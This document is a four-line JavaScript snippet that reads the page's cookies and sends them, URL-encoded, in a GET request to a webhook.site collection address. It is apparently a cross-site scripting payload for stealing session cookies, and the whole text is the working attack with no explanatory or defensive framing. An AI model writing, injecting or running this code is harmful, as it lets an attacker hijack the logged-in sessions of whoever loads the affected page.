var cookieValue = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open("GET", "//webhook.site/8198bfcb-4a79-4d3f-8e60-1fafa57145a9?q=" + encodeURIComponent(cookieValue), true);
xhr.send();
